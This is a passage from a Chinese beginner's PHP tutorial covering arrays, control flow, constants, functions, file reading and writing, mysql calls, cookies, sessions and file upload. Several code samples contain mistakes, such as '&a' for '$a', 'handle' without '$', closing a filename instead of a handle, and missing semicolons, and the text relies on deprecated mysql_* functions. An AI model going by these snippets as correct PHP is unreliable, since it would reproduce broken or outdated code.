class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>);</span><br><span class="line">array_push(<span class="variable">$a</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;yellow&quot;</span>);</span><br><span class="line">print_r(&amp;a); <span class="comment">//打印所有数组出来</span></span><br></pre></td></tr></table></figure><ul><li>通过使用array_pop()函数删除最后一个数组元素出入栈)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> =<span class="keyword">array</span>(<span class="string">&quot;red&quot;</span>,<span class="string">&quot;green&quot;</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">array_pop(<span class="variable">$a</span>);</span><br><span class="line">print_r(&amp;a); <span class="comment">//打印所有数组出来</span></span><br><span class="line"><span class="comment">//结果为 &quot;red&quot;,&quot;green&quot;</span></span><br></pre></td></tr></table></figure><ul><li>数组的排序</li></ul><table><thead><tr><th>排序函数</th><th>作用</th><th>属性</th></tr></thead><tbody><tr><td>sort()</td><td>以升序对数组排序</td><td>基本排序</td></tr><tr><td>rsort()</td><td>以降序对数组排序</td><td>基本排序</td></tr><tr><td>ksort()</td><td>根据键值，以升序对关联数组进行排序</td><td>键值排序</td></tr><tr><td>krsort()</td><td>根据键值，以降序对关联数组进行排序</td><td>键值排序</td></tr><tr><td>asort()</td><td>根据值，以升序对关联数组进行排序</td><td>值排序</td></tr><tr><td>arsort()</td><td>根据值，以降序对关联数组进行排序</td><td>值排序</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">10</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>);</span><br><span class="line"><span class="variable">$arr2</span> = sort(<span class="variable">$arr</span>);</span><br><span class="line">print_r(<span class="variable">$arr</span>);    <span class="comment">//排序后在arr，不在arr2,arr2只会输出true、false</span></span><br></pre></td></tr></table></figure><h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2><ul><li><strong>if 语句</strong> - 在条件成立时执行代码</li><li><strong>if…else 语句</strong> - 在条件成立时执行一块代码，条件不成立时执行另一块代码</li><li><strong>if…elseif….else 语句</strong> - 在若干条件之一成立时执行一个代码块</li><li><strong>switch case 语句</strong> - 在若干条件之一成立时执行一个代码块</li></ul><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><ul><li><strong>while</strong> - 只要指定的条件成立，则循环执行代码块</li><li><strong>do…while</strong> - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li><li><strong>for</strong> - 循环执行代码块指定的次数</li><li><strong>foreach($array as $value)</strong> - 根据数组中每个元素来循环代码块    ps：js里用的是 for in</li></ul><h2 id="PHP-常量"><a href="#PHP-常量" class="headerlink" title="PHP 常量"></a>PHP 常量</h2><ul><li><p>常量值被定义后，在脚本的其他任何地方都不能被改变。</p></li><li><p>常量在定义后，默认是全局变量，可以在整个运行的脚本的任何地方使用。</p></li><li><p>设置常量，使用 define() 函数，函数语法如下：</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 区分大小写的常量名</span></span><br><span class="line">define(<span class="string">&quot;BB&quot;</span>, <span class="string">&quot;hello dashuaibi!&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> BB;    <span class="comment">// 输出 &quot;hello dashuaibi!&quot;  不需带$符号可直接调用</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> bb;   <span class="comment">// 报错</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 不区分大小写的常量名</span></span><br><span class="line">define(<span class="string">&quot;BB&quot;</span>, <span class="string">&quot;hello dashuaibi!&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> bb;   <span class="comment">// 不报错</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li>形参实参</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;    <span class="comment">//形参</span></span><br><span class="line">    <span class="variable">$m</span> = <span class="variable">$m</span> *<span class="number">5</span>+<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;在函数内：&quot;</span>.<span class="variable">$m</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$m</span> = <span class="number">1</span>;            <span class="comment">//实参</span></span><br><span class="line">bb(<span class="variable">$m</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;在函数外：&quot;</span>.<span class="variable">$m</span>   </span><br></pre></td></tr></table></figure><ul><li>默认参数</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bb</span>(<span class="params"><span class="variable">$m</span>,<span class="variable">$n</span>=<span class="string">&quot;1&quot;</span></span>)</span>&#123;    <span class="comment">//默认值参数</span></span><br><span class="line">    <span class="variable">$m</span> = <span class="variable">$m</span> +<span class="variable">$n</span>;</span><br><span class="line">&#125;</span><br><span class="line">bb(<span class="number">5</span>,<span class="number">6</span>); <span class="comment">//给两个可选参数赋值后，则覆盖参数默认值</span></span><br><span class="line">bb(<span class="number">5</span>);  <span class="comment">//没有给可选参数赋值，默认为1</span></span><br></pre></td></tr></table></figure><h2 id="自定全局变量"><a href="#自定全局变量" class="headerlink" title="自定全局变量"></a>自定全局变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="number">5</span>;</span><br><span class="line">    <span class="variable">$y</span>=<span class="number">10</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">myfunction</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$x</span>,<span class="variable">$y</span>;</span><br><span class="line">        <span class="variable">$y</span>=<span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$y</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">myfunction();</span><br><span class="line"><span class="meta">?&gt;</span>      </span><br></pre></td></tr></table></figure><h2 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h2><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><h2 id="常用字符串函数"><a href="#常用字符串函数" class="headerlink" title="常用字符串函数"></a>常用字符串函数</h2><table><thead><tr><th>函数</th><th>说明</th><th>语法</th></tr></thead><tbody><tr><td>strlen</td><td>计算字符串的长度</td><td>strlen(变量名)</td></tr><tr><td>substr</td><td>截取字符串，采用起点一长度方式</td><td>substr(string 源字符串,int start[,int length])</td></tr><tr><td>strstr</td><td>截取字符串，采用子串一结尾方式</td><td>strstr(string 原串，string标识)</td></tr><tr><td>explode</td><td>分割字符串，将字符串毁成数组</td><td>explode(string separator,string string [,int limit])</td></tr><tr><td>trim</td><td>去掉左右空格</td><td>trim (string 字符串)</td></tr><tr><td>md5</td><td>计算字符串的MD5哈希（加密）</td><td>md5 (string 字符串)</td></tr><tr><td>mb_strlen()</td><td>计算中文字符串的长度</td><td>strlen(变量名)</td></tr></tbody></table><p>参考：<a href="https://www.runoob.com/php/php-ref-string.html">https://www.runoob.com/php/php-ref-string.html</a></p><h2 id="常用变量函数"><a href="#常用变量函数" class="headerlink" title="常用变量函数"></a>常用变量函数</h2><table><thead><tr><th>类型</th><th>说明</th><th>语法</th></tr></thead><tbody><tr><td>empty</td><td>检查变量是否为空，为空返回true，否则为false</td><td>empty(变量)</td></tr><tr><td>gettype</td><td>获取变量的类型</td><td>gettype(变量)</td></tr><tr><td>is_array</td><td>检查变量是否为数组类型</td><td>is_array(变量)</td></tr><tr><td>isset</td><td>检查变量是否被设置或赋值</td><td>isset(变量)</td></tr><tr><td>unset</td><td>释放给定变量，即销毁变量</td><td>unset(变量)</td></tr><tr><td>var_dump</td><td>打印变量的相关信息</td><td>var_dump(变量)</td></tr></tbody></table><h2 id="时间日期函数"><a href="#时间日期函数" class="headerlink" title="时间日期函数"></a>时间日期函数</h2><table><thead><tr><th>函数</th><th>说明</th><th>语法</th></tr></thead><tbody><tr><td>checkdate</td><td>验证日期的有效性</td><td>checkdate(1,1,2022)</td></tr><tr><td>date</td><td>格式化一个本地时间/日期</td><td>date(Y-m-d H:i:s)</td></tr></tbody></table><p>参考：<a href="https://www.runoob.com/php/php-ref-date.html">https://www.runoob.com/php/php-ref-date.html</a></p><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><ul><li><p>关键字class开头</p></li><li><p>类是抽象的对象，对象是具体化的类。</p></li><li><p>可理解为类是带参数的对象，是一个空白的对象模板。</p></li><li><p>人类是一个类，比尔盖茨则是一个对象。</p></li><li><p>类有属性(变量) 和方法(函数)</p></li><li><p>代码重复使用、灵活性强，减少代码重复臃肿，提高执行效率。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;       <span class="comment">//创建一个类  *没有()！！！！</span></span><br><span class="line">    <span class="keyword">var</span>  <span class="variable">$name</span>;           <span class="comment">//类属性</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;my name is&#x27;</span>.<span class="keyword">$this</span>-&gt;name;<span class="comment">// *this</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ps : $this关键字是用来访问当前对象中的对象属性和方法的系统变量,记住就好。</p><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><ul><li>用new从类中实例化一个对象</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xm</span> = <span class="keyword">new</span> person; <span class="comment">//实例化对象</span></span><br><span class="line"><span class="variable">$xm</span> -&gt;name = <span class="string">&#x27;大帅比&#x27;</span>; <span class="comment">//对对象属性进行赋值</span></span><br><span class="line"><span class="variable">$xm</span> -&gt;say();     <span class="comment">//访问对象的方法</span></span><br></pre></td></tr></table></figure><h2 id="php文件读取"><a href="#php文件读取" class="headerlink" title="php文件读取"></a>php文件读取</h2><table><thead><tr><th>操作步骤</th><th>函数名称</th><th>作用</th></tr></thead><tbody><tr><td>打开文件1</td><td>fopen()</td><td>打开文件</td></tr><tr><td>文件读取2</td><td>fread()</td><td>读取文件指定长度的字符串</td></tr><tr><td>文件读取3</td><td>fgets()</td><td>读取文件一行内容</td></tr><tr><td>文件读取4</td><td>feof()</td><td>检测是否已经到达文件末尾</td></tr><tr><td>文件写入5</td><td>fwrite()</td><td>写入数据</td></tr><tr><td>关闭文件6</td><td>fclose()</td><td>关闭文件</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;c:\\data\\info.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);   <span class="comment">//r 只读  w 写入 a 追加写入</span></span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;/home/file.gif&quot;</span>,<span class="string">&quot;wb&quot;</span>);    </span><br></pre></td></tr></table></figure><ul><li><p>打开文件常用函数</p><table><thead><tr><th>fopen()参数</th><th>说明</th></tr></thead><tbody><tr><td>r</td><td>以只读的方式打开，如果文件不存在将出错</td></tr><tr><td>w</td><td>以写入的方式打开，将文件指针指向文件头部，并删除文件内容，如果文件不存在则创建</td></tr><tr><td>a</td><td>以追加写入的方式打开，将文件指针指向文件末尾，如果文件不存在则创建</td></tr><tr><td>r+</td><td>以读写的方式(先读后写)打开，将文件指针指向文件头部</td></tr><tr><td>w+</td><td>以读写的方式打开，将文件指针指向文件头部，并删除文件内容</td></tr><tr><td>a+</td><td>以追加读写的方式打开，将文件指针指向文件末尾</td></tr><tr><td>x</td><td>以只写的方式创建并打开文件，并将文件指针指向文件头，如果文件存在，就会打开失败</td></tr><tr><td>x+</td><td>以读写的方式创建并打开文件，并将文件指针指向文件头。如果指定文件存在，就会打开失败</td></tr><tr><td>b</td><td>以二进制模式打开，可与r\w\a合用</td></tr></tbody></table></li><li><p>读取文件常用函数</p></li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>fread()</td><td>读取整个文件或文件中指定长度的字符串，可用于二进制文件读取</td></tr><tr><td>fgets()</td><td>读取文件中的一行字符</td></tr><tr><td>fgetss()</td><td>读取文件中的一行字符，并去掉所有html和php标记</td></tr><tr><td>fgetc()</td><td>读取文件中的一个字符</td></tr><tr><td>file_get_contents()</td><td>将文件读入字符串</td></tr><tr><td>file()</td><td>把文件读入到一个数组中</td></tr><tr><td>readfile()</td><td>读取整个文件或文件中指定长度的字符串，可用于二进制文件读取</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>);       <span class="comment">//不能直接打开文件</span></span><br><span class="line"><span class="variable">$data</span> = fread(<span class="variable">$handle</span>,filesize(<span class="variable">$file</span>));  <span class="comment">//打开全部</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">fclose(<span class="variable">$file</span>);    <span class="comment">//关闭文件操作</span></span><br></pre></td></tr></table></figure><ul><li>循环读取文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;hello.txt&quot;</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$filename</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$handle</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(!feof(handle))    <span class="comment">//!取反  检测是否到达文件末尾，到达文件末尾为真，</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$line</span> = fgets(&amp;handle);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$line</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>；</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$filename</span> open failed&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="php文件写入"><a href="#php文件写入" class="headerlink" title="php文件写入"></a>php文件写入</h2><ul><li>fwrite()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;bb is dashuaibi!!&#x27;</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$file</span>,<span class="string">&#x27;w&#x27;</span>);  <span class="comment">//or die (&#x27;cannot open file &#x27;.$file);</span></span><br><span class="line"><span class="variable">$write</span> = fwrite(<span class="variable">$handle</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$write</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;write successful!&#x27;</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;write failed!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$handle</span>);</span><br></pre></td></tr></table></figure><ul><li><p>file_get_contents()&amp;file_put_contents函数读写文件</p><p>无需打开文件关闭文件就可以操作读取写入</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);<span class="comment">//读文件</span></span><br><span class="line"><span class="keyword">echo</span> file_put_contents(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;内容&quot;</span>,FILE_APPEND);<span class="comment">//以追加方式写文件</span></span><br></pre></td></tr></table></figure> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;test.txt&#x27;</span>; </span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;bb is dashuaibi&#x27;</span>;</span><br><span class="line"><span class="variable">$write</span> = file_put_contents(<span class="variable">$file</span>,<span class="variable">$data</span>,FILE_APPEND); <span class="comment">//写文件,FILE_APPEND 追加模式</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$write</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;write successful!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><ul><li>文件复制、移动删除的函数</li></ul><table><thead><tr><th>函数</th><th>语法</th><th>说明</th></tr></thead><tbody><tr><td>copy()</td><td>copy(源文件，目标文件)</td><td>复制文件</td></tr><tr><td>unlink()</td><td>unlink(目标文件)</td><td>删除文件</td></tr><tr><td>rename()</td><td>rename(旧文件名，新文件名)</td><td>重命名文件或目录，或移动文件</td></tr><tr><td>ftruncate()</td><td>ftruncate(目标文件资源，截取长度)</td><td>将文件截断到指定长度</td></tr><tr><td>file_exists</td><td>file_exists(目标文件名)</td><td>判断文件或文件夹是否存在</td></tr><tr><td>is_file()</td><td>is_file(文件名)</td><td>判断指定的路径存在且为文件</td></tr></tbody></table><ul><li>获取文件的属性</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>filesize()</td><td>只读，返回文件的大小</td></tr><tr><td>filetype()</td><td>只读，返回文件的类型，如文件文件夹</td></tr><tr><td>filectime()</td><td>返回文件创建的时间的时间戳</td></tr><tr><td>filemtime()</td><td>只读返回文件的修改时间</td></tr><tr><td>realpath()</td><td>返回文件的物理路径</td></tr><tr><td>pathinfo()</td><td>以数组形式返回文件的路径和文件名信息</td></tr></tbody></table><ul><li>目录的基本操作</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>mkdir(pathname)</td><td>新建一个指定的目录</td><td>mkdir(‘temp’)</td></tr><tr><td>rmdir(dirname)</td><td>删除目录，该目录必须为空</td><td>rmdir(‘data’)</td></tr><tr><td>getcwd(void)</td><td>取得当前文件所在的目录</td><td>echo getcwd();</td></tr><tr><td>chdir(dirname)</td><td>改变当前目录</td><td>chdir(‘…/‘);</td></tr><tr><td>opendir(path)</td><td>打开目录，返回目录的指针</td><td>$dirh=opendir(‘temp’);</td></tr><tr><td>closedir()</td><td>关闭目录，参数为目录指针</td><td>closedir($dirh);</td></tr><tr><td>readdir()</td><td>遍历目录</td><td>$file=readdir($dirh);</td></tr><tr><td>scandir(path,sort)</td><td>以数组形式便利目录，sort参数可设置升序或降序排列</td><td>$arr=scandir(‘D:\bb’1);</td></tr></tbody></table><h2 id="php-mysql操作"><a href="#php-mysql操作" class="headerlink" title="php mysql操作"></a>php mysql操作</h2><p>连接一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(host,name,pass)</span><br></pre></td></tr></table></figure><p>选择一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql_select_db(sqlname,<span class="variable">$conn</span>) ;  <span class="comment">//已被弃用</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,sqlname);  <span class="comment">//mysqli 和 mysql刚好相反！！！！！</span></span><br></pre></td></tr></table></figure><p>查询一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(SQL,connect)    </span><br></pre></td></tr></table></figure><p>输出一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql_fetch_array( mysql_query)  <span class="comment">#从结果集中取得一行作为枚举数组！--&gt;返回键值对数组</span></span><br><span class="line">mysql_fetch_row(mysql_query)   <span class="comment">#从结果集中取得一行作为枚举数组！--&gt;返回下标数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array( mysql_query))&#123;   <span class="comment">//正确取值,如果按变量赋值则陷入死循环.</span></span><br><span class="line">    <span class="comment">//代码块</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_num_rows (mysql_query)  <span class="comment">#获取由select语句查询到的结果集中行的数目</span></span><br></pre></td></tr></table></figure><h2 id="php-文件包含"><a href="#php-文件包含" class="headerlink" title="php 文件包含"></a>php 文件包含</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>include()</td><td>文件包含失败时，会产生警告，脚本会继续运行</td></tr><tr><td>require()</td><td>文件包含失败时，会产生错误，直接结束脚本执行</td></tr><tr><td>include_once()</td><td>与include()功能相同，文件只会被包含一次</td></tr><tr><td>require_once()</td><td>与require()功能相同，文件只会被包含一次</td></tr></tbody></table><h2 id="setcookie"><a href="#setcookie" class="headerlink" title="setcookie()"></a>setcookie()</h2><ul><li><strong>创建COOKIE</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name,value,expire,path,domain,secure);</span><br></pre></td></tr></table></figure><ul><li><p><strong>读取COOKIE</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 输出 cookie 值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看所有 cookie</span></span><br><span class="line">print_r(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="comment">// 判断 cookie</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;欢迎 &quot;</span> . <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>] . <span class="string">&quot;!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>删除COOKIE</strong></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;&quot;</span>, time()-<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h2 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION()"></a>SESSION()</h2><ul><li><p><strong>启动会话</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span>  <span class="comment">//放文件头!</span></span><br></pre></td></tr></table></figure></li><li><p><strong>存储会话</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储 session 数据</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>读取会话</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]))</span><br></pre></td></tr></table></figure></li><li><p><strong>摧毁会话</strong></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]);</span><br><span class="line">session_destroy();</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul><li><strong>form表单</strong></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span>    </span><br></pre></td></tr></table></figure><ul><li><strong>$_FILES[]</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">print_r(<span class="variable">$_FILES</span>[])  <span class="comment">//超级全局变量 都是一个数组.</span></span><br><span class="line"><span 